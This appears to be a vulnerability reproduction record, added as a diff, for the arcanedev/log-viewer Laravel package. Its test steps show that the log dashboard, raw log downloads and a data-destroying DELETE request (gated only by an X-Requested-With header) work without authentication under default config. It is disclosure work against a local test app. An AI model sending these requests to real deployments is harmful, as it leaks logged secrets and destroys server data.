@@ -1,0 +1,40 @@
+### LGV-01 - ARCANEDEV/LogViewer v11: dashboard/download/delete unauthenticated by default (route middleware = null)
+### App: fresh Laravel 11 (laravel/laravel v11.6.1) + composer require arcanedev/log-viewer (^11.0), stock config (ARCANEDEV_LOGVIEWER_MIDDLEWARE unset -> middleware null). No session, no cookie, no token in any request below.
+
+### T1: GET /log-viewer/ (dashboard) - no auth
+HTTP 200 | bytes 16562 | content-type text/html; charset=utf-8
+dashboard markers:       3 log-viewer 
+log dates listed on dashboard: 
+
+### T2: GET /log-viewer/logs (JSON list) - no auth
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="LogViewer">
+    <meta name="author" content="ARCANEDEV">
+    <title>LogViewer - Created by ARCANEDEV</title>
+    
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" r
+### T3: GET /log-viewer/logs/2026-09-30/download (raw log file) - no auth
+HTTP/1.1 200 OK
+Content-Disposition: attachment; filename=laravel-2026-09-30.log
+Content-Type: text/plain; charset=utf-8
+downloaded content: [2026-09-29 16:56:01] local.ERROR: LGV-TEST-ENTRY: sensitive stack trace placeholder user@example.com  
+[2026-09-30 00:56:00] local.ERROR: LGV-TEST-ENTRY secret-token-ABC123 {"exception":"[object] (RuntimeException(code: 0): Sensitive placeholder at <REDACTED-PATH>/routes/web.php:17)"}
+
+### T4a: DELETE /log-viewer/logs/delete WITHOUT ajax header -> expect 405 (only gate: ajax header, not CSRF/auth)
+<!DOCTYPE html>
+<html lang="en">
+<head>
+
+### T4b: DELETE /log-viewer/logs/delete WITH X-Requested-With: XMLHttpRequest (no CSRF token, no auth, no session) -> destructive delete
+file before: -rw-r--r-- 1 <REDACTED> <REDACTED> 283 Sep 30 00:56 lgv-test/storage/logs/laravel-2026-09-30.log
+{"result":"success"}
+HTTP 200
+file after:  ls: cannot access 'lgv-test/storage/logs/laravel-2026-09-30.log': No such file or directory
+
+### T5 (confirm dashboard reflects deletion, still unauthenticated):
+GET /log-viewer -> HTTP 200
+DELETE without ajax header -> HTTP 405
